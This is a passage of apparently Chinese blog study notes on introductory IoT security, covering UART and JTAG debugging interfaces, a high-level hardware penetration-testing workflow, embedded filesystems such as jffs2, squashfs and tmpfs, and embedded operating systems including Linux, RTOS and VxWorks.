<li><a href="https://www.ifixit.com/">https://www.ifixit.com</a></li>
<li><a href="https://fccid.io/">https://fccid.io</a></li>
</ol>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819145220702.png" alt="image-20220819145220702"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819145246679.png" alt="image-20220819145246679"></p>
<h4 id="2-3-模块"><a href="#2-3-模块" class="headerlink" title="2.3 模块"></a>2.3 模块</h4><p>蓝牙模块是一种集成蓝牙功能的PCBA板，主要用于无线网络通讯，按功能可分为蓝牙数据模块（HY-40R201P、HY- 40R204P）和蓝牙语音模块</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819145412749.png" alt="image-20220819145412749"></p>
<ul>
<li>医疗领域：低周波按摩器、温度计、血压计、电子秤等</li>
<li>体育领域：智能穿戴设备、运动器材、心率监测仪器等</li>
<li>工业领域：物料跟踪、资产管理等</li>
<li>智能家居领域：智能锁、窗帘、小电器等</li>
<li>其它领域：信标、胎压监测、移动支付等</li>
</ul>
<h2 id="0x02-物联网通信接口调试"><a href="#0x02-物联网通信接口调试" class="headerlink" title="0x02 物联网通信接口调试"></a>0x02 物联网通信接口调试</h2><h3 id="1-常见通信接口"><a href="#1-常见通信接口" class="headerlink" title="1. 常见通信接口"></a>1. 常见通信接口</h3><h4 id="1-1-通信接口"><a href="#1-1-通信接口" class="headerlink" title="1.1 通信接口"></a>1.1 通信接口</h4><p>通信接口是指微型计算机系统与其他系统直接进行数字通信的接口电路。通常分串行通信接口和并行通信接口两种，即串口和并口。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220819145734759.png" alt="image-20220819145734759"></p>
<h4 id="1-2-异步-同步通信"><a href="#1-2-异步-同步通信" class="headerlink" title="1.2 异步&#x2F;同步通信"></a>1.2 异步&#x2F;同步通信</h4><p>同步通信</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822223243830.png" alt="image-20220822223243830"></p>
<p>异步通信</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822223313150.png" alt="image-20220822223313150"></p>
<h4 id="1-3-基本概念"><a href="#1-3-基本概念" class="headerlink" title="1.3 基本概念"></a>1.3 基本概念</h4><ol>
<li><p>波特率：每秒传送的二进制位数</p>
<p>国际上规定了一个标准波特率系列：110、300、600、1200、1800、2400、4800、9600、14.4Kbps、19.2Kbps、28.8Kbps、33.6Kbps、56Kbps</p>
</li>
<li><p>发送&#x2F;接收时钟</p>
</li>
<li><p>波特率因子</p>
<p>在波特率指定后，输入移位寄存器&#x2F;输出移位寄存器在接收时钟&#x2F;发送时钟控制下，按指定的波特率速度进行移位</p>
</li>
</ol>
<h3 id="2-UART接口"><a href="#2-UART接口" class="headerlink" title="2. UART接口"></a>2. UART接口</h3><h4 id="2-1-UART"><a href="#2-1-UART" class="headerlink" title="2.1 UART"></a>2.1 UART</h4><p>通用异步收发传输器（Universal Asynchronous Receiver&#x2F;Transmitter，通常称作UART） 是一种串行异步收发协议，应用十分广泛。UART工作原理是将数据的二进制位一位一位的进行传输。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822234256936.png" alt="image-20220822234256936"></p>
<h4 id="2-2-UART原理"><a href="#2-2-UART原理" class="headerlink" title="2.2 UART原理"></a>2.2 UART原理</h4><ul>
<li>第一设备的UART发送引脚连接到第二设备的接收引脚，接收引脚连接到发送引脚</li>
<li>UART 是一种异步串行传输，所以它不使用时钟，使用波特率进行预定速度传输数据</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822234523078.png" alt="image-20220822234523078"></p>
<p>空闲位、起始位、数据位、奇偶校验位、中止位</p>
<h4 id="2-3-现实中的UART接口"><a href="#2-3-现实中的UART接口" class="headerlink" title="2.3 现实中的UART接口"></a>2.3 现实中的UART接口</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822234629881.png" alt="image-20220822234629881"></p>
<h4 id="2-4-电脑设备如何使用UART通信接口"><a href="#2-4-电脑设备如何使用UART通信接口" class="headerlink" title="2.4 电脑设备如何使用UART通信接口"></a>2.4 电脑设备如何使用UART通信接口</h4><p>硬件设备：TTL转USB</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822234719795.png" alt="image-20220822234719795"></p>
<p>软件工具：minicom &#x2F; SecureCRT </p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822234809673.png" alt="image-20220822234809673"></p>
<p>使用minicom连接UART接口</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822235416263.png" alt="image-20220822235416263"></p>
<p>使用Secure CRT连接UART接口</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822235437520.png" alt="image-20220822235437520"></p>
<h3 id="3-JTAG接口"><a href="#3-JTAG接口" class="headerlink" title="3. JTAG接口"></a>3. JTAG接口</h3><h4 id="3-1-JTAG"><a href="#3-1-JTAG" class="headerlink" title="3.1 JTAG"></a>3.1 JTAG</h4><p>JTAG(Joint Test Action Group，联合测试工作组)是一种国际标准测试协议（IEEE 1149.1兼容），主要用于芯片内部测试。现在多数的高级器件都支持JTAG协议，如DSP、FPGA器件等。标准的JTAG接口是4线：TMS、TCK、TDI、TDO，分别为模式选择、时钟、数据输入和数据输出线。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822235551055.png" alt="image-20220822235551055"></p>
<p>SWD是ARM公司提出的另一种调试接口，相对于JTAG接口，使用更少的信号。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220822235712952.png" alt="image-20220822235712952"></p>
<p><strong>3.2 JTAG接口信号</strong></p>
<p>标准的JATG接口定义了以下一些信号管脚：</p>
<p>TMS：测试模式选择信号，输入，IEEE 1149.1标准强制要求</p>
<p>TCK：测试时钟信号，输入，IEEE 1149.1标准强制要求</p>
<p>TDI：测试数据输入信号，输入，IEEE 1149.1标准强制要求</p>
<p>TDO：测试数据输出信号，输出，IEEE 1149.1标准强制要求</p>
<p>TRST：内部TAP控制器复位信号，输入，IEEE 1149.1标准不强制要求，因为通过TMS也可以对TAP Controller进行复位</p>
<p>STAG：时钟返回信号，IEEE 1149.1标准不强制要求</p>
<p>DBGRQ：目标板上工作状态的控制信号，IEEE 1149.1标准不强制要求</p>
<h4 id="3-2-TAP"><a href="#3-2-TAP" class="headerlink" title="3.2 TAP"></a>3.2 TAP</h4><p>TAP（Test Access Port）（测试访问端口)的缩写,是芯片内部一个通用的端口，通过TAP可以访问芯片提供的所有数据寄存器（DR）和指令寄存器（IR），对整个TAP的控制是通过TAP控制器（TAP Controller）完成的。</p>
<p>TAP控制器有16个同步状态，TAP控制器作为一个被TMS信号控制转换的状态机，控制着JTAG系统的行为</p>
<p><strong>TAP状态机</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823000306050.png" alt="image-20220823000306050"></p>
<h4 id="3-3-JTAG接口指令集"><a href="#3-3-JTAG接口指令集" class="headerlink" title="3.3 JTAG接口指令集"></a>3.3 JTAG接口指令集</h4><p>JTAG接口指令集包含以下常用指令：</p>
<p>EXTEST指令、SAMPLE&#x2F;PRELOAD指令、BYPASS指令、IDCODE指令</p>
<h4 id="3-4-现实中的JTAG接口"><a href="#3-4-现实中的JTAG接口" class="headerlink" title="3.4 现实中的JTAG接口"></a>3.4 现实中的JTAG接口</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823000434620.png" alt="image-20220823000434620"></p>
<h4 id="3-5-JTAG接口调试"><a href="#3-5-JTAG接口调试" class="headerlink" title="3.5 JTAG接口调试"></a>3.5 JTAG接口调试</h4><p>软件工具：st-link &#x2F; J-Link Commander（jLink）</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823000551320.png" alt="image-20220823000551320"></p>
<p>硬件设备：J-Link &#x2F; ST-Link等</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823000630097.png" alt="image-20220823000630097"></p>
<p>注：J-Link具有下载和调试功能，而ST-Link仅有下载功能。</p>
<h2 id="0x03-物联网硬件渗透测试流程"><a href="#0x03-物联网硬件渗透测试流程" class="headerlink" title="0x03 物联网硬件渗透测试流程"></a>0x03 物联网硬件渗透测试流程</h2><h3 id="1-工具准备"><a href="#1-工具准备" class="headerlink" title="1. 工具准备"></a>1. 工具准备</h3><h4 id="1-1-硬件准备"><a href="#1-1-硬件准备" class="headerlink" title="1.1 硬件准备"></a>1.1 硬件准备</h4><p>万用表、硬件拆解套装</p>
<p>USB转串口转换器：Shikra，CP2102等</p>
<p>JTAG接口转换器：Shikra，JTAGulator等</p>
<p>逻辑分析仪：Saleae Logic等</p>
<p>等等</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823124512900.png" alt="image-20220823124512900"></p>
<h3 id="2-物联网硬件渗透测试"><a href="#2-物联网硬件渗透测试" class="headerlink" title="2. 物联网硬件渗透测试"></a>2. 物联网硬件渗透测试</h3><h4 id="2-1-物联网硬件渗透测试"><a href="#2-1-物联网硬件渗透测试" class="headerlink" title="2.1 物联网硬件渗透测试"></a>2.1 物联网硬件渗透测试</h4><ul>
<li>设备的外部和内部分析</li>
<li>信息收集和侦查</li>
<li>确定通信接口</li>
<li>利用硬件通信技术获取数据</li>
<li>硬件后门</li>
</ul>
<h4 id="2-2-物联网硬件渗透测试-设备的外部和内部分析"><a href="#2-2-物联网硬件渗透测试-设备的外部和内部分析" class="headerlink" title="2.2 物联网硬件渗透测试-设备的外部和内部分析"></a>2.2 物联网硬件渗透测试-设备的外部和内部分析</h4><ul>
<li>设备的各种接口，例如USB端口，SD卡插槽或以太网端口等</li>
<li>设备的供电方式，例如电池，PPoE或适配器供电等</li>
<li>设备上的标签信息</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823124822212.png" alt="image-20220823124822212"></p>
<p><img src="D:/Typora/typora-user-images/image-20220823124856130.png" alt="image-20220823124856130"></p>
<h4 id="2-3-物联网硬件渗透测试-信息收集和侦查"><a href="#2-3-物联网硬件渗透测试-信息收集和侦查" class="headerlink" title="2.3 物联网硬件渗透测试-信息收集和侦查"></a>2.3 物联网硬件渗透测试-信息收集和侦查</h4><ul>
<li>设备基于什么开发：例如8051，PLC等</li>
<li>设备运行的操作系统，例如Arm-Linux，嵌入式Linux，Windows CE等</li>
<li>设备支持哪些外设，例如AFE，ADC&#x2F;DAC ，USB，CAN总线等</li>
<li>设备使用的芯片组，例如cortex-M0，FPGA，ARM9等</li>
<li>设备中使用的存储和内存的详细信息，例如AT24C02、FM24C02等</li>
<li>设备的任何其他相关技术信息，例如设备上市时间等等</li>
</ul>
<h4 id="2-4-物联网硬件渗透测试-确定通信接口"><a href="#2-4-物联网硬件渗透测试-确定通信接口" class="headerlink" title="2.4 物联网硬件渗透测试-确定通信接口"></a>2.4 物联网硬件渗透测试-确定通信接口</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823125151101.png" alt="image-20220823125151101"></p>
<h4 id="2-5-物联网硬件渗透测试-利用硬件通信技术获取数据"><a href="#2-5-物联网硬件渗透测试-利用硬件通信技术获取数据" class="headerlink" title="2.5 物联网硬件渗透测试-利用硬件通信技术获取数据"></a>2.5 物联网硬件渗透测试-利用硬件通信技术获取数据</h4><p><strong>JTAG：</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823125245640.png" alt="image-20220823125245640"></p>
<p><strong>UART：</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823125327740.png" alt="image-20220823125327740"></p>
<h4 id="2-6-物联网硬件渗透测试-硬件后门"><a href="#2-6-物联网硬件渗透测试-硬件后门" class="headerlink" title="2.6 物联网硬件渗透测试-硬件后门"></a>2.6 物联网硬件渗透测试-硬件后门</h4><p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823125401345.png" alt="image-20220823125401345"></p>
<p>不同厂商可能使用相同的芯片，如果硬件出现漏洞，影响范围通常会非常大。</p>
]]></content>
      <categories>
        <category>IoT安全入门</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>IoT安全入门04</title>
    <url>/2023/03/28/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IoT%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A804/</url>
    <content><![CDATA[<h1 id="第四章-物联网固件层安全讲解"><a href="#第四章-物联网固件层安全讲解" class="headerlink" title="第四章 物联网固件层安全讲解"></a>第四章 物联网固件层安全讲解</h1><h2 id="0x01-文件系统详解"><a href="#0x01-文件系统详解" class="headerlink" title="0x01 文件系统详解"></a>0x01 文件系统详解</h2><h3 id="1-文件系统简介"><a href="#1-文件系统简介" class="headerlink" title="1. 文件系统简介"></a>1. 文件系统简介</h3><h4 id="1-1-文件系统简介"><a href="#1-1-文件系统简介" class="headerlink" title="1.1 文件系统简介"></a>1.1 文件系统简介</h4><p>文件系统是操作系统用于明确存储设备（常见是磁盘，也有基于NAND Flash的固态硬盘）或分区上的文件的方法和数据结构；即在存储设备上组织文件的方法。操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823155713987.png" alt="image-20220823155713987"></p>
<span id="more"></span>

<p><strong>根文件系统简介</strong></p>
<p>根文件系统首先是内核启动时所mount的第一个文件系统，内核代码影像文件保存在根文件系统中，而系统引导启动程序会在跟文件系统挂在之后从中把一些基本的初始化脚本和服务等加载到内存中去运行。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823155921906.png" alt="image-20220823155921906"></p>
<p><strong>文件系统实现</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202011101111_K2FTZ5TCAPTZHWP.png" alt="FileSystem"></p>
<p><strong>常见嵌入式文件系统</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202011101111_TN7XJ9KW3UM335E.png" alt="FileSystemCom"></p>
<p><code>df -ahT</code>：查看当前系统的所有文件系统</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/202011101112_E68KJQ3FZH9HJ6H.png" alt="LinuxVFS"></p>
<h3 id="2-常见的文件系统"><a href="#2-常见的文件系统" class="headerlink" title="2. 常见的文件系统"></a>2. 常见的文件系统</h3><h4 id="2-1-常见的文件系统-Flash"><a href="#2-1-常见的文件系统-Flash" class="headerlink" title="2.1 常见的文件系统-Flash"></a>2.1 常见的文件系统-Flash</h4><p><strong>jffs&#x2F;jffs2：</strong></p>
<ul>
<li>JFFS文件系统最早是由瑞典Axis Communications 公司基于Linux2.0的内核为嵌入式系统开发的文件系统。JFFS2是RedHat公司基于JFFS开发的闪存文件系统，最初是针对RedHat公司的嵌入式产品eCos开发的嵌入式文件系统。</li>
<li>Jffs2：日志闪存文件系统版本2 (Journalling Flash FileSystem v2)<br>主要用于NOR型闪存，基于MTD驱动层，特点是：可读写的、支持数据压缩的、基于哈希表的日志型文件系统，并提供了崩溃&#x2F;掉电安全保护，提供“写平衡”支持等</li>
<li>缺点:当文件系统已满或接近满时，因为垃圾收集的关系而使jffs2的运行速度大大放慢</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823160521074.png" alt="image-20220823160521074"></p>
<p><strong>yaffs&#x2F;yaffs2：</strong>Yet Another Flash File System</p>
<ul>
<li>yaffs&#x2F;yaffs2是专为嵌入式系统使用NAND型闪存而设计的一种日志型文件系统。</li>
<li>与jffs2相比，它减少了一些功能（例如不支持数据压缩），所以速度更快，挂载时间很短，对内存的占用较小。</li>
<li>yaffs&#x2F;yaffs2自带NAND芯片的驱动，并且为嵌入式系统提供了直接访问文件系统的API，用户可以不使用Linux中的MTD与VFS，直接对文件系统操作。当然，yaffs也可与MTD驱动程序配合使用</li>
<li>yaffs与yaffs2的主要区别在于，前者仅支持小页（512 Bytes）NAND闪存，后者则可支持大页（2KB）NAND闪存。同时，yaffs2在内存空间占用、垃圾回收速度、读&#x2F;写速度等方面均有大幅提升</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220823160831338.png" alt="image-20220823160831338"></p>
<p><strong>Cramfs：</strong>Compressed ROM File System</p>
<ul>
<li>Cramfs是Linux的创始人Linus Torvalds参与开发的一种只读的压缩文件系统。它基于MTD驱动程序。</li>
<li>在cramfs文件系统中，每一页(4KB)被单独压缩，可以随机页访问，其压缩比高达2:1，为嵌入式系统节省大量的Flash存储空间，使系统可通过更低容量的FLASH存储相同的文件，从而降低系统成本。</li>
<li>Cramfs文件系统以压缩方式存储，在运行时解压缩，所以不支持应用程序以XIP（eXecute In Place，芯片内执行）方式运行，所有的应用程序要求被拷到RAM里去运行。</li>
<li>它的速度快，效率高，其只读的特点有利于保护文件系统免受破坏，提高了系统的可靠性。</li>
<li>缺陷：它的只读属性同时又是它的一大缺陷，使得用户无法对其内容对进扩充</li>
</ul>
<p><strong>squashfs：</strong></p>
<ul>
<li>squashfs可以将整个文件系统或者某个单一的目录压缩在一起，存放在某个设备，某个分区或者普通的文件中。如果你将其压缩到一个设备中，那么你可以将其直接mount起来使用；而如果它仅仅是个文件，你可以将其当为一个loopback设备使用。</li>
<li>特点:<ul>
<li>数据(data)，节点(inode)和目录(directories )都被压缩。</li>
<li>保存了全部的32位UID&#x2F;GIDS和文件的创建时间. (注: cramfs是8位，没有创建时间)。</li>
<li>支持多达4G的文件系统. (cramfs是16M)。</li>
<li>节点和目录都是高度压缩，而且都是存储在字节边界(packed on byte boundaries)</li>
<li>squashfs可以允许块大小(block size)达32Kb(1. x)和64kb(2.x), 这样可以达到比4K块大小更大的压缩率。</li>
<li>squashfs 2引进了碎片块(fragment blocks)的概念: 一种将许多比块size小的文件存储在一个块中，以达到更大的压缩率</li>
</ul>
</li>
</ul>
<p><strong>UBIFS</strong></p>
<ul>
<li>nokiaI程师在the university of Szeged大学帮助下开发的新的Flash<br>filesystem。UBIFS可以认为是JFFS2文件系统的下一代。UBIFS文件系统是专门为大容量FLASH嵌入式移动设备设计的，挂载UBIFS文件系统必须有mtd接口，而普通的PC机通常都不用mtd管理磁盘。</li>
<li>UBIFS通过子系统UBI处理与MTD device之间的动作。与JFFS2一样，UBIFS建构于MTD device之上，因而与一般的block device不兼容。</li>
<li>UBIFS及其使用的UBI子系统，是一种用在大容量flash，上的文件系统。</li>
<li>特点：可扩展性，快速mount，write-back支持，异常unmount适应度，快速I&#x2F;0，on-the_ flight compression，可恢复性，完整性</li>
</ul>
<h4 id="2-2-常见的文件系统-内存"><a href="#2-2-常见的文件系统-内存" class="headerlink" title="2.2 常见的文件系统-内存"></a>2.2 常见的文件系统-内存</h4><p><strong>Ramdisk</strong></p>
<ul>
<li>Ramdisk是将一部分固定大小的内存当作分区来使用。它并非一个实际的文件系统，而是一种将实际的文件系统装入内存的机制，并且可以作为根文件系统。将一些经常被访问而又不会更改的文件(如只读的根文件系统)通过Randisk放在内存中，可以明显地提高系统的性能。</li>
<li>在Linux的启动阶段，initrd提供了一套机制，可以将内核映像和根文件系统一起载入内存。</li>
</ul>
<p><strong>ramfs&#x2F;tmpfs</strong></p>
<ul>
<li>Ramfs是Linus Torvalds开发的一种基于内存的文件系统，工作于虚拟文件系统(VFS)层，不能格式化，可以创建多个，在创建时可以指定其最大能使用的内存大小。</li>
<li>Ramfs&#x2F;tmpfs文件系统把所有的文件都放在RAM中，所以读&#x2F;写操作发生在RAM中，可以用ramfs&#x2F; tmpfs来存储一些临时性或经常要修改的数据，例如&#x2F; tmp和&#x2F;var目录，这样既避免了对Flash存储器的读写损耗，也提高了数据读写速度。</li>
<li>Ramfs&#x2F; tmpfs相对于传统的Ramdisk的不同之处主要在于：不能格式化，文件系统大小可随所含文件内容大小变化。</li>
<li>Tmpfs的一个缺点是当系统重新引导时会丢失所有数据。</li>
</ul>
<h4 id="2-3-常见的文件系统-网络文件系统"><a href="#2-3-常见的文件系统-网络文件系统" class="headerlink" title="2.3 常见的文件系统-网络文件系统"></a>2.3 常见的文件系统-网络文件系统</h4><p>网络文件系统NFS（Network File System）</p>
<ul>
<li>NFS是由Sun开发并发展起来的一项在不同机器、不同操作系统之间通过网络共享文件的技术。在嵌入式Linux系统的开发调试阶段，可以利用该技术在主机上建立基于NFS的根文件系统，挂载到嵌入式设备，可以很方便地修改根文件系统的内容。</li>
</ul>
<h4 id="2-4-常见的文件系统-虚拟文件系统"><a href="#2-4-常见的文件系统-虚拟文件系统" class="headerlink" title="2.4 常见的文件系统-虚拟文件系统"></a>2.4 常见的文件系统-虚拟文件系统</h4><p><strong>procfs</strong></p>
<p><strong>&#x2F;proc</strong> 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在Linux内核空间和用户间之间进行通信。在**&#x2F;proc** 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的。</p>
<p>#  -t 是指定文件系统类型，第二个参数是挂载设备，因为是内核设备，所以写none，第三个参数是挂载目录</p>
<p><code>mount -t proc none /proc </code></p>
<p># 或者在 &#x2F;etc&#x2F;fstab条目下添加</p>
<p><code>none /proc proc defaults 0 0</code></p>
<p>在fstab下添加会在开机以后自动挂载 </p>
<p><strong>tmpfs</strong></p>
<ul>
<li>tmpfs ( temporary filesystem )是Linux特有的文件系统，标准挂载点是&#x2F;dev&#x2F;shm，默认大小是实际内存的一半，如下图所示。当然，用户也可以将tmpfs挂载在其他地方。tmpfs可以使用物理内存，也可以使用swap交换空间。</li>
<li>tmpfs有些像虚拟磁盘( ramdisk)，但ramdisk是一个块设备，而且需要一个mkfs之类的命令格式化后才能使用。而tmpfs是一个独立的文件系统，不是块设备，只要挂载，就可以立即使用。</li>
<li>tmpfs特点: <ul>
<li>临时性</li>
<li>快速读写能力</li>
<li>动态收缩</li>
</ul>
</li>
</ul>
<h2 id="0x02-常见嵌入式操作系统详解"><a href="#0x02-常见嵌入式操作系统详解" class="headerlink" title="0x02 常见嵌入式操作系统详解"></a>0x02 常见嵌入式操作系统详解</h2><h3 id="1-操作系统简介"><a href="#1-操作系统简介" class="headerlink" title="1. 操作系统简介"></a>1. 操作系统简介</h3><h4 id="1-1-操作系统简介"><a href="#1-1-操作系统简介" class="headerlink" title="1.1 操作系统简介"></a>1.1 操作系统简介</h4><p>操作系统(英语: Operating System,，缩写: OS)是一组主管并控制计算机操作、运用和运行硬件、软件资源和提供公共服务来组织用户交互的相互关联的系统软件程序，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827101854708.png" alt="image-20220827101854708"></p>
<h4 id="1-2-操作系统的作用"><a href="#1-2-操作系统的作用" class="headerlink" title="1.2 操作系统的作用"></a>1.2 操作系统的作用</h4><ul>
<li>用户界面（GUI）</li>
<li>进程管理</li>
<li>内存管理</li>
<li>文件系统</li>
<li>网络通信</li>
<li>设备管理</li>
<li>······</li>
</ul>
<h4 id="1-3-操作系统的分类"><a href="#1-3-操作系统的分类" class="headerlink" title="1.3 操作系统的分类"></a>1.3 操作系统的分类</h4><p>根据<strong>内核结构</strong>划分：</p>
<ul>
<li>微内核（Windows）</li>
<li>宏内核（Linux）</li>
</ul>
<p>根据<strong>用途</strong>划分：</p>
<ul>
<li>通用操作系统（PC等）</li>
<li>嵌入式操作系统（物联网设备等）</li>
<li>专用操作系统（军事、医疗等）</li>
</ul>
<p>根据<strong>信号处理的实时性</strong>划分：</p>
<ul>
<li>实时操作系统（RTOS，Vxworks等）</li>
<li>分时操作系统（Linux等）</li>
</ul>
<h3 id="2-嵌入式操作系统"><a href="#2-嵌入式操作系统" class="headerlink" title="2. 嵌入式操作系统"></a>2. 嵌入式操作系统</h3><h4 id="2-1-分时操作系统"><a href="#2-1-分时操作系统" class="headerlink" title="2.1 分时操作系统"></a>2.1 分时操作系统</h4><p><strong>分时操作系统（time-sharing）：</strong></p>
<ul>
<li>计算机科学中对资源的一种共享方式，利用多道程序与多任务处理使多个用户可以同时使用一台计算机。</li>
<li>把计算机与许多终端用户连接起来，分时操作系统将系统处理机时间与内存空间按一定的时间间隔，轮流地切换给各终端用户的程序使用。由于时间间隔很短，每个用户的感觉就像他独占计算机一样。分时操作系统的特点是可有效增加资源的使用率。</li>
<li>时间片：是把计算机的系统资源(尤其是CPU时间)进行时间，上的分割，每个时间段称为一个时间片，每个用户依次轮流使用时间片。</li>
<li>分时技术：把处理机的运行时间分为很短的时间片，按时间片轮流把处理机分给各联机作业使用。</li>
</ul>
<p><strong>Linux</strong></p>
<p>Linux内核(英语: Linux kernel )，是一种开源个类Unix操作系统宏内核。整个Linux操作系统家族基于该内核部署拉传统计算机平台（如个人计算机搭服务器，以Linux发行版个形式）搭各种嵌入式平台，如路由器、无线接入点、专用小交换机、机顶盒、FTA接收器、智能电视、数字视频录像机、网络附加存储(NAS)等。 工作拉平板电脑、智能手机搭智能手表个Android操作系统同样通过Linux内核提供个服务完成自身功能。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102615587.png" alt="image-20220827102615587"></p>
<p><strong>Linux目录结构</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102748745.png" alt="image-20220827102748745"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102813726.png" alt="image-20220827102813726"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102833128.png" alt="image-20220827102833128"></p>
<p><strong>Linux Kernel</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102901055.png" alt="image-20220827102901055"></p>
<p><strong>Linux镜像</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827102928902.png" alt="image-20220827102928902"></p>
<h4 id="2-2-RTOS"><a href="#2-2-RTOS" class="headerlink" title="2.2 RTOS"></a>2.2 RTOS</h4><ul>
<li><p>实时操作系统( Real-time operating system, RTOS ) ，又称即时操作系统，它会按照排序运行、管理系统资源,并为开发应用程序提供一致的基础。</p>
</li>
<li><p>实时操作系统与一般的操作系统相比,最大的特色就是“实时性”，如果有一个任务需要执行，实时操作系统会马上(在较短时间内)执行该任务，不会有较长的延时。这种特性保证了各个任务的及时执行。</p>
</li>
<li><p>设计实时操作系统的首要目标不是高的吞吐量，而是保证任务在特定时间内完成，因此衡量一个实时操作系统坚固性的重要指标，是系统从接收一个任务，到完成该任务所需的时间，其时间的变化称为抖动。可以依抖动将实时操作系统分为两种：硬实时操作系统及软实时操作系统，硬实时操作系统比软实时操作系统有更少的抖<br>动：</p>
<ul>
<li>硬实时操作系统必须使任务在确定的时间内完成。</li>
<li>软实时操作系统能让绝大多数任务在确定时间内完成。</li>
</ul>
</li>
<li><p>实时操作系统与一般的操作系统有着不同的调度算法。普通的操作系统的调度器对于线程优先级等方面的处理更加灵活;而实时操作系统追求最小的中断延时和线程切换延时。</p>
</li>
<li><p>通常都会有最基础的内核，以及外加上去的模块，像是文件系统、网络协议堆栈和应用、设备驱动程序等模块。</p>
</li>
</ul>
<p><strong>常见RTOS</strong></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827103426742.png" alt="image-20220827103426742"></p>
<p><strong>Vxworks</strong></p>
<p>特点：</p>
<ul>
<li>Vxworks既是一个操作系统，又是一个可以运行的最小基本程序</li>
<li>Vxworks有BSP（可以认为是一种低层驱动），可以减小驱动程序的编写过程</li>
<li>Vxworks具有强大的调试能力，可以在没有仿真器的情况下，通过串口调试</li>
<li>Vxworks具有软件DEBUG功能，可以对软件部分进行模拟调试</li>
<li>Vxworks具有丰富的函数库</li>
<li>同时Vxworks自带TCP&#x2F;IP协议栈</li>
</ul>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827103729222.png" alt="image-20220827103729222"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827103747683.png" alt="image-20220827103747683"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827103801538.png" alt="image-20220827103801538"></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20220827103816747.png" alt="image-20220827103816747"></p>
